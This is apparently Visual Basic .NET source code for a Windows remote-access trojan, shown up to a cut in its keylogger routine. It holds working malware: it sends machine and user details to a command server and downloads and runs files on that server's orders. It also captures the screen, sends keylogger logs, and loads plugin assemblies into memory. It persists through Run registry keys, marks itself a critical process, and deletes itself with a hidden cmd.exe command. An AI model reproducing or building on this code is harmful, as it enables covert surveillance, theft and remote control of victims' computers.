Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.RuntiInteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Security.Cryptography
Imports System.Runtime.InteropServices
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic.Devices
Public Class lol
    Public Shared Sub main()
        MsgBox("hello :) ")
        Exploit.ko()




    End Sub
End Class

Public Class Exploit





    Public Shared Function ACT() As String
        Dim str As String
        Try
            Dim foregroundWindow As IntPtr = GetForegroundWindow()
            If (foregroundWindow = IntPtr.Zero) Then
                Return ""
            End If
            Dim winTitle As String = Strings.Space((GetWindowTextLength(CLng(foregroundWindow)) + 1))
            GetWindowText(foregroundWindow, winTitle, winTitle.Length)
            str = ENB(winTitle)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str = ""
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    Public Shared Function BS(ByRef B As Byte()) As String
        Return Encoding.UTF8.GetString(B)
    End Function

    Public Shared Function Cam() As Boolean
        Try
            Dim num As Integer = 0
            Do
                Dim lpszVer As String = Nothing
                If capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                    Return True
                End If
                num += 1
            Loop While (num <= 4)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return False
    End Function

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    End Function


    Public Shared Function connect() As Boolean
        Cn = False
        Thread.Sleep(&H7D0)
        Dim lOO As FileInfo = LO
        SyncLock lOO
            Try
                If (Not C Is Nothing) Then
                    Try
                        C.Close()
                        C = Nothing
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        ProjectData.ClearProjectError()
                    End Try
                End If
                Try
                    MeM.Dispose()
                Catch exception6 As Exception
                    ProjectData.SetProjectError(exception6)
                    Dim exception2 As Exception = exception6
                    ProjectData.ClearProjectError()
                End Try
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception3 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                MeM = New MemoryStream
                C = New TcpClient
                C.ReceiveBufferSize = &H32000
                C.SendBufferSize = &H32000
                C.Client.SendTimeout = &H2710
                C.Client.ReceiveTimeout = &H2710
                C.Connect(H, Conversions.ToInteger(P))
                Cn = True
                Send(inf)
                Try
                    Dim str As String
                    If Operators.ConditionalCompareObjectEqual(GTV("vn", ""), "", False) Then
                        str = (str & DEB(VN) & ChrW(13) & ChrW(10))
                    Else
                        str = (str & DEB(Conversions.ToString(GTV("vn", ""))) & ChrW(13) & ChrW(10))
                    End If
                    str = ((((((String.Concat(New String() {str, H, ":", P, ChrW(13) & ChrW(10)}) & DR & ChrW(13) & ChrW(10)) & EXE & ChrW(13) & ChrW(10)) & Conversions.ToString(Idr) & ChrW(13) & ChrW(10)) & Conversions.ToString(IsF) & ChrW(13) & ChrW(10)) & Conversions.ToString(Isu) & ChrW(13) & ChrW(10)) & Conversions.ToString(BD))
                    Send(("inf" & Y & ENB(str)))
                Catch exception8 As Exception
                    ProjectData.SetProjectError(exception8)
                    Dim exception4 As Exception = exception8
                    ProjectData.ClearProjectError()
                End Try
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception5 As Exception = exception9
                Cn = False
                ProjectData.ClearProjectError()
            End Try
        End SyncLock
        Return Cn
    End Function

    Public Shared Function DEB(ByRef s As String) As String
        Return BS(Convert.FromBase64String(s))
    End Function

    Public Shared Sub DLV(ByVal n As String)
        Try
            F.Registry.CurrentUser.OpenSubKey(("Software\" & RG), True).DeleteValue(n)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Sub ED()
        pr(0)
    End Sub

    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(SB(s))
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
    End Function

    Public Shared Function GTV(ByVal n As String, ByVal ret As Object) As Object
        Dim obj2 As Object
        Try
            obj2 = F.Registry.CurrentUser.OpenSubKey(("Software\" & RG)).GetValue(n, RuntimeHelpers.GetObjectValue(ret))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            obj2 = ret
            ProjectData.ClearProjectError()
        End Try
        Return obj2
    End Function

    Public Shared Function HWD() As String
        Dim str As String
        Try
            Dim num As Integer
            Dim lpVolumeNameBuffer As String
            Dim lpMaximumComponentLength As Integer = 0
            Dim lpFileSystemFlags As Integer = 0
            Dim lpFileSystemNameBuffer As String
            GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
            str = Conversion.Hex(num)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str = "ERR"
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    Public Shared Sub Ind(ByVal b As Byte())
        Dim strArray As String() = Strings.Split(BS(b), Y, -1, CompareMethod.Binary)
        Try
            Dim buffer As Byte()
            Dim str4 As String = strArray(0)
            Select Case str4
                Case "ll"
                    Cn = False
                    Return
                Case "kl"
                    Send(("kl" & Y & ENB(Logs)))
                    Return
                Case "prof"
                    Select Case strArray(1)
                        Case "~"
                            STV(strArray(2), strArray(3), RegistryValueKind.String)
                            Exit Select
                        Case "!"
                            STV(strArray(2), strArray(3), RegistryValueKind.String)
                            Send(Conversions.ToString(Operators.ConcatenateObject((("getvalue" & Y) & strArray(1) & Y), GTV(strArray(1), ""))))
                            Exit Select
                        Case "@"
                            DLV(strArray(2))
                            Exit Select
                    End Select
                    Return
            End Select
            If (str4 <> "rn") Then
                GoTo Label_0294
            End If
            If (strArray(2).Chars(0) = ChrW(31)) Then
                Try
                    Dim stream As New MemoryStream
                    Dim length As Integer = (strArray(0) & Y & strArray(1) & Y).Length
                    stream.Write(b, length, (b.Length - length))
                    buffer = ZIP(stream.ToArray)
                    GoTo Label_020B
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Send(("MSG" & Y & "Execute ERROR"))
                    Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
            End If
            Dim client As New WebClient
            Try
                buffer = client.DownloadData(strArray(2))
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception2 As Exception = exception10
                Send(("MSG" & Y & "Download ERROR"))
                Send("bla")
                ProjectData.ClearProjectError()
                Return
            End Try
Label_020B:
            Send("bla")
            Dim path1 As String = (Path.GetTempFileName.ToString & "." & strArray(1))
            Try
                File.WriteAllBytes(path1, buffer)
                Process.Start(path1)
                Send(("MSG" & Y & "Executed As " & New FileInfo(path1).Name))
                Return
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception3 As Exception = exception11
                Send(("MSG" & Y & "Execute ERROR " & exception3.Message))
                ProjectData.ClearProjectError()
                Return
            End Try
Label_0294:
            Select Case str4
                Case "inv"
                    Dim t As Byte() = DirectCast(GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                    If ((strArray(3).Length < 10) And (t.Length = 0)) Then
                        Send(String.Concat(New String() {"pl", Y, strArray(1), Y, Conversions.ToString(1)}))
                    Else
                        If (strArray(3).Length > 10) Then
                            Dim stream2 As New MemoryStream
                            Dim offset As Integer = String.Concat(New String() {strArray(0), Y, strArray(1), Y, strArray(2), Y}).Length
                            stream2.Write(b, offset, (b.Length - offset))
                            t = ZIP(stream2.ToArray)
                            STV(strArray(1), t, RegistryValueKind.Binary)
                        End If
                        Send(String.Concat(New String() {"pl", Y, strArray(1), Y, Conversions.ToString(0)}))
                        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Plugin(t, "A"))
                        NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {H}, Nothing, Nothing)
                        NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {P}, Nothing, Nothing)
                        NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                        NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                        Do While Not Conversions.ToBoolean(Operators.OrObject(Not Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                            Thread.Sleep(1)
                        Loop
                        NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                    End If
                    Return
                Case "ret"
                    Dim buffer3 As Byte() = DirectCast(GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                    If ((strArray(2).Length < 10) And (buffer3.Length = 0)) Then
                        Send(String.Concat(New String() {"pl", Y, strArray(1), Y, Conversions.ToString(1)}))
                    Else
                        If (strArray(2).Length > 10) Then
                            Dim stream3 As New MemoryStream
                            Dim num3 As Integer = (strArray(0) & Y & strArray(1) & Y).Length
                            stream3.Write(b, num3, (b.Length - num3))
                            buffer3 = ZIP(stream3.ToArray)
                            STV(strArray(1), buffer3, RegistryValueKind.Binary)
                        End If
                        Send(String.Concat(New String() {"pl", Y, strArray(1), Y, Conversions.ToString(0)}))
                        Dim instance As Object = RuntimeHelpers.GetObjectValue(Plugin(buffer3, "A"))
                        Send(String.Concat(New String() {"ret", Y, strArray(1), Y, ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                    End If
                    Return
                Case "CAP"
                    Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                    Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
                    Dim g As Graphics = Graphics.FromImage(image)
                    Dim blockRegionSize As New Size(image.Width, image.Height)
                    g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                    Try
                        blockRegionSize = New Size(&H20, &H20)
                        bounds = New Rectangle(Cursor.Position, blockRegionSize)
                        Cursors.Default.Draw(g, bounds)
                    Catch exception12 As Exception
                        ProjectData.SetProjectError(exception12)
                        Dim exception4 As Exception = exception12
                        ProjectData.ClearProjectError()
                    End Try
                    g.Dispose()
                    Dim bitmap2 As New Bitmap(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                    g = Graphics.FromImage(bitmap2)
                    g.DrawImage(image, 0, 0, bitmap2.Width, bitmap2.Height)
                    g.Dispose()
                    Dim stream4 As New MemoryStream
                    b = SB(("CAP" & Y))
                    stream4.Write(b, 0, b.Length)
                    Dim stream5 As New MemoryStream
                    bitmap2.Save(stream5, ImageFormat.Jpeg)
                    Dim str2 As String = md5(stream5.ToArray)
                    If (str2 <> lastcap) Then
                        lastcap = str2
                        stream4.Write(stream5.ToArray, 0, CInt(stream5.Length))
                    Else
                        stream4.WriteByte(0)
                    End If
                    Sendb(stream4.ToArray)
                    stream4.Dispose()
                    stream5.Dispose()
                    image.Dispose()
                    bitmap2.Dispose()
                    Return
                Case "un"
                    Select Case strArray(1)
                        Case "~"
                            UNS()
                            Exit Select
                        Case "!"
                            pr(0)
                            ProjectData.EndApp()
                            Exit Select
                        Case "@"
                            pr(0)
                            Process.Start(LO.FullName)
                            ProjectData.EndApp()
                            Exit Select
                    End Select
                    Return
            End Select
            If (str4 <> "up") Then
                GoTo Label_0A1C
            End If
            Dim bytes As Byte() = Nothing
            If (strArray(1).Chars(0) = ChrW(31)) Then
                Try
                    Dim stream6 As New MemoryStream
                    Dim num4 As Integer = (strArray(0) & Y).Length
                    stream6.Write(b, num4, (b.Length - num4))
                    bytes = ZIP(stream6.ToArray)
                    GoTo Label_097B
                Catch exception13 As Exception
                    ProjectData.SetProjectError(exception13)
                    Dim exception5 As Exception = exception13
                    Send(("MSG" & Y & "Update ERROR"))
                    Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
            End If
            Dim client2 As New WebClient
            Try
                bytes = client2.DownloadData(strArray(1))
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception6 As Exception = exception14
                Send(("MSG" & Y & "Update ERROR"))
                Send("bla")
                ProjectData.ClearProjectError()
                Return
            End Try
Label_097B:
            Send("bla")
            Dim fileName As String = (Path.GetTempFileName & ".exe")
            Try
                Send(("MSG" & Y & "Updating To " & New FileInfo(fileName).Name))
                Thread.Sleep(&H7D0)
                File.WriteAllBytes(fileName, bytes)
                Process.Start(fileName, "..")
            Catch exception15 As Exception
                ProjectData.SetProjectError(exception15)
                Dim exception7 As Exception = exception15
                Send(("MSG" & Y & "Update ERROR " & exception7.Message))
                ProjectData.ClearProjectError()
                Return
            End Try
            UNS()
            Return
Label_0A1C:
            If (str4 = "Ex") Then
                If (PLG Is Nothing) Then
                    Send("PLG")
                    Dim num5 As Integer = 0
                    Do While Not (((Not PLG Is Nothing) Or (num5 = 20)) Or Not Cn)
                        num5 += 1
                        Thread.Sleep(&H3E8)
                    Loop
                    If ((PLG Is Nothing) Or Not Cn) Then
                        Return
                    End If
                End If
                Dim arguments As Object() = New Object() {b}
                Dim copyBack As Boolean() = New Boolean() {True}
                NewLateBinding.LateCall(PLG, Nothing, "ind", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                End If
            ElseIf (str4 = "PLG") Then
                Dim stream7 As New MemoryStream
                Dim num6 As Integer = (strArray(0) & Y).Length
                stream7.Write(b, num6, (b.Length - num6))
                PLG = RuntimeHelpers.GetObjectValue(Plugin(ZIP(stream7.ToArray), "A"))
                NewLateBinding.LateSet(PLG, Nothing, "H", New Object() {H}, Nothing, Nothing)
                NewLateBinding.LateSet(PLG, Nothing, "P", New Object() {P}, Nothing, Nothing)
                NewLateBinding.LateSet(PLG, Nothing, "c", New Object() {C}, Nothing, Nothing)
            End If
        Catch exception16 As Exception
            ProjectData.SetProjectError(exception16)
            Dim exception8 As Exception = exception16
            If ((strArray.Length > 0) AndAlso ((strArray(0) = "Ex") Or (strArray(0) = "PLG"))) Then
                PLG = Nothing
            End If
            Try
                Send(String.Concat(New String() {"ER", Y, strArray(0), Y, exception8.Message}))
            Catch exception17 As Exception
                ProjectData.SetProjectError(exception17)
                Dim exception9 As Exception = exception17
                ProjectData.ClearProjectError()
            End Try
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Function inf() As String
        Dim str2 As String = ("ll" & Y)
        Try
            If Operators.ConditionalCompareObjectEqual(GTV("vn", ""), "", False) Then
                str2 = (str2 & ENB((DEB(VN) & "_" & HWD())) & Y)
            Else
                str2 = (str2 & ENB((DEB(Conversions.ToString(GTV("vn", ""))) & "_" & HWD())) & Y)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str2 = (str2 & ENB(HWD) & Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & Environment.MachineName & Y)
        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception2 As Exception = exception9
            str2 = (str2 & "??" & Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & Environment.UserName & Y)
        Catch exception10 As Exception
            ProjectData.SetProjectError(exception10)
            Dim exception3 As Exception = exception10
            str2 = (str2 & "??" & Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & LO.LastAccessTimeUtc.ToString("yy-MM-dd") & Y)
        Catch exception11 As Exception
            ProjectData.SetProjectError(exception11)
            Dim exception4 As Exception = exception11
            str2 = (str2 & "??-??-??" & Y)
            ProjectData.ClearProjectError()
        End Try
        str2 = (str2 & "" & Y)
        Try
        Catch exception12 As Exception
            ProjectData.SetProjectError(exception12)
            Dim exception5 As Exception = exception12
            str2 = (str2 & "??")
            ProjectData.ClearProjectError()
        End Try
        str2 = (str2 & "SP")
        Try
            Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
            If (strArray.Length = 1) Then
                str2 = (str2 & "0")
            End If
            str2 = (str2 & strArray((strArray.Length - 1)))
        Catch exception13 As Exception
            ProjectData.SetProjectError(exception13)
            Dim exception6 As Exception = exception13
            str2 = (str2 & "0")
            ProjectData.ClearProjectError()
        End Try
        Try
            If Environment.GetFolderPath(Environment.SpecialFolder.Programs).Contains("x86") Then
                str2 = (str2 & " x64" & Y)
            Else
                str2 = (str2 & " x86" & Y)
            End If
        Catch exception14 As Exception
            ProjectData.SetProjectError(exception14)
            Dim exception7 As Exception = exception14
            str2 = (str2 & Y)
            ProjectData.ClearProjectError()
        End Try
        If Cam() Then
            str2 = (str2 & "Yes" & Y)
        Else
            str2 = (str2 & "No" & Y)
        End If
        str2 = (((str2 & VR & Y) & ".." & Y) & ACT() & Y)
        Dim str3 As String = ""
        Try
            Dim str4 As String
            For Each str4 In F.Registry.CurrentUser.CreateSubKey(("Software\" & RG), RegistryKeyPermissionCheck.Default).GetValueNames
                If (str4.Length = &H20) Then
                    str3 = (str3 & str4 & ",")
                End If
            Next
        Catch exception15 As Exception
            ProjectData.SetProjectError(exception15)
            Dim exception8 As Exception = exception15
            ProjectData.ClearProjectError()
        End Try
        Return (str2 & str3)
    End Function


    Public Shared Sub ko()
        If (Not Interaction.Command Is Nothing) Then
            Try
                F.Registry.CurrentUser.SetValue("di", "!")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Thread.Sleep(&H1388)
        End If
        Dim createdNew As Boolean = False
        MT = New Mutex(True, RG, createdNew)
        If Not createdNew Then
            ProjectData.EndApp()
        End If

        If Not Idr Then
            EXE = LO.Name
            DR = LO.Directory.Name
        End If

        Dim t As Thread = New Thread(New ThreadStart(AddressOf RC), 1)
        t.Start()
        Try
            Dim t1 As Thread = New Thread(New ThreadStart(AddressOf WRK), 1)
            t1.Start()

        Catch exception8 As Exception
            ProjectData.SetProjectError(exception8)
            Dim exception2 As Exception = exception8
            ProjectData.ClearProjectError()
        End Try
        Dim num As Integer = 0
        Dim str As String = ""
        If BD Then
            Try
                AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf ED)
                pr(1)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception3 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
        End If
        Do While True
            Thread.Sleep(&H3E8)
            If Not Cn Then
                str = ""
            End If
            Application.DoEvents()
            Try
                num += 1
                If (num = 5) Then
                    Try
                    Catch exception10 As Exception
                        ProjectData.SetProjectError(exception10)
                        Dim exception4 As Exception = exception10
                        ProjectData.ClearProjectError()
                    End Try
                End If
                If (num >= 8) Then
                    num = 0
                    Dim str2 As String = ACT()
                    If (str <> str2) Then
                        str = str2
                        Send(("act" & Y & str2))
                    End If
                End If
                If Isu Then
                    Try
                        If Operators.ConditionalCompareObjectNotEqual(F.Registry.CurrentUser.GetValue((sf & "\" & RG), ""), ("""" & LO.FullName & """ .."), False) Then
                            F.Registry.CurrentUser.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
                        End If
                    Catch exception11 As Exception
                        ProjectData.SetProjectError(exception11)
                        Dim exception5 As Exception = exception11
                        ProjectData.ClearProjectError()
                    End Try
                    Try
                        If Operators.ConditionalCompareObjectNotEqual(F.Registry.LocalMachine.GetValue((sf & "\" & RG), ""), ("""" & LO.FullName & """ .."), False) Then
                            F.Registry.LocalMachine.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
                        End If
                    Catch exception12 As Exception
                        ProjectData.SetProjectError(exception12)
                        Dim exception6 As Exception = exception12
                        ProjectData.ClearProjectError()
                    End Try
                End If
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception7 As Exception = exception13
                ProjectData.ClearProjectError()
            End Try
        Loop
    End Sub

    Public Shared Function md5(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function

    <DllImport("ntdll")>
    Public Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function

    Public Shared Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
        Dim module1 As [Module]
        For Each module1 In Assembly.Load(b).GetModules
            Dim typeA As Type
            For Each typeA In module1.GetTypes
                If typeA.FullName.EndsWith(("." & c)) Then
                    Return module1.Assembly.CreateInstance(typeA.FullName)
                End If
            Next
        Next
        Return Nothing
    End Function

    Public Shared Sub pr(ByVal i As Integer)
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Sub RC()
Label_0000:
        lastcap = ""
        If (Not C Is Nothing) Then
            Dim num As Long = -1
            Dim num2 As Integer = 0
            Try
Label_001B:
                num2 += 1
                If (num2 = 10) Then
                    num2 = 0
                    Thread.Sleep(1)
                End If
                If Not Cn Then
                    GoTo Label_01C1
                End If
                If (C.Available < 1) Then
                    C.Client.Poll(-1, SelectMode.SelectRead)
                End If
Label_0057:
                If (C.Available > 0) Then
                    If (num = -1) Then
                        Dim str As String = ""
                        Do While True
                            Dim charCode As Integer = C.GetStream.ReadByte
                            Select Case charCode
                                Case -1
                                    GoTo Label_01C1
                                Case 0
                                    num = Conversions.ToLong(str)
                                    str = ""
                                    If (num = 0) Then
                                        Send("")
                                        num = -1
                                    End If
                                    If (C.Available <= 0) Then
                                        GoTo Label_001B
                                    End If
                                    GoTo Label_0057
                            End Select
                            str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                        Loop
                    End If
                    b = New Byte((C.Available + 1) - 1) {}
                    Dim num5 As Long = (num - MeM.Length)
                    If (b.Length > num5) Then
                        b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                    End If
                    Dim count As Integer = C.Client.Receive(b, 0, b.Length, SocketFlags.None)
                    MeM.Write(b, 0, count)
                    If (MeM.Length = num) Then
                        num = -1

                        Dim thread As New Thread(New ParameterizedThreadStart(AddressOf Ind), 1)
                        thread.Start(MeM.ToArray)
                        thread.Join(100)
                        MeM.Dispose()
                        MeM = New MemoryStream
                    End If
                    GoTo Label_001B
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End If
Label_01C1:
        Try
            If (Not PLG Is Nothing) Then
                NewLateBinding.LateCall(PLG, Nothing, "clear", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                PLG = Nothing
            End If
        Catch exception3 As Exception
            ProjectData.SetProjectError(exception3)
            Dim exception2 As Exception = exception3
            ProjectData.ClearProjectError()
        End Try
        Cn = False
        If Not connect() Then
            GoTo Label_01C1
        End If
        Cn = True
        GoTo Label_0000
    End Sub

    Public Shared Function SB(ByRef S As String) As Byte()
        Return Encoding.UTF8.GetBytes(S)
    End Function

    Public Shared Function Send(ByVal S As String) As Boolean
        Return Sendb(SB(S))
    End Function

    Public Shared Function Sendb(ByVal b As Byte()) As Boolean
        If Not Cn Then
            Return False
        End If
        Try
            Dim lOO As FileInfo = LO
            SyncLock lOO
                If Not Cn Then
                    Return False
                End If
                Dim stream As New MemoryStream
                Dim length As Integer = b.Length
                Dim buffer As Byte() = SB((length.ToString & ChrW(0)))
                stream.Write(buffer, 0, buffer.Length)
                stream.Write(b, 0, b.Length)
                C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
            End SyncLock
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Try
                If Cn Then
                    Cn = False
                    C.Close()
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            ProjectData.ClearProjectError()
        End Try
        Return Cn
    End Function

    Public Shared Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
        Dim flag As Boolean
        Try
            F.Registry.CurrentUser.CreateSubKey(("Software\" & RG)).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ)
            flag = True
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            flag = False
            ProjectData.ClearProjectError()
        End Try
        Return flag
    End Function

    Public Shared Sub UNS()
        pr(0)
        Isu = False
        Try
            F.Registry.CurrentUser.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Try
            F.Registry.LocalMachine.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch exception7 As Exception
            ProjectData.SetProjectError(exception7)
            Dim exception2 As Exception = exception7
            ProjectData.ClearProjectError()
        End Try
        Try
            Interaction.Shell(("netsh firewall delete allowedprogram """ & LO.FullName & """"), AppWinStyle.Hide, False, -1)
        Catch exception8 As Exception
            ProjectData.SetProjectError(exception8)
            Dim exception3 As Exception = exception8
            ProjectData.ClearProjectError()
        End Try
        Try

        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception4 As Exception = exception9
            ProjectData.ClearProjectError()
        End Try
        Try
            F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(RG, False)
        Catch exception10 As Exception
            ProjectData.SetProjectError(exception10)
            Dim exception5 As Exception = exception10
            ProjectData.ClearProjectError()
        End Try
        Try
            Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & LO.FullName & """"), AppWinStyle.Hide, False, -1)
        Catch exception11 As Exception
            ProjectData.SetProjectError(exception11)
            Dim exception6 As Exception = exception11
            ProjectData.ClearProjectError()
        End Try
        ProjectData.EndApp()
    End Sub

    Public Shared Function ZIP(ByVal B As Byte()) As Byte()
        Dim stream2 As New MemoryStream(B)
        Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
        Dim buffer2 As Byte() = New Byte(4 - 1) {}
        stream2.Position = (stream2.Length - 5)
        stream2.Read(buffer2, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
        stream2.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream.Read(array, 0, count)
        stream.Dispose()
        stream2.Dispose()
        Return array
    End Function







    Public Shared Function AV() As String
        Try
            Dim num As Integer
            Dim foregroundWindow As IntPtr = GetForegroundWindow()
            GetWindowThreadProcessId(foregroundWindow, num)
            Dim processById As Process = Process.GetProcessById(num)
            If Not (((foregroundWindow.ToInt32 = LastAV) And (LastAS = processById.MainWindowTitle)) Or (processById.MainWindowTitle.Length = 0)) Then
                LastAV = foregroundWindow.ToInt32
                LastAS = processById.MainWindowTitle
                Return String.Concat(New String() {ChrW(13) & ChrW(10) & ChrW(1), DateAndTime.Now.ToString("yy/MM/dd "), processById.ProcessName, " ", LastAS, ChrW(1) & ChrW(13) & ChrW(10)})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return ""
    End Function

    Public Shared Function Fix(ByVal k As Keys) As String
        Dim str As String
        Dim shiftKeyDown As Boolean = F.Keyboard.ShiftKeyDown
        If F.Keyboard.CapsLock Then
            If shiftKeyDown Then
                shiftKeyDown = False
            Else
                shiftKeyDown = True
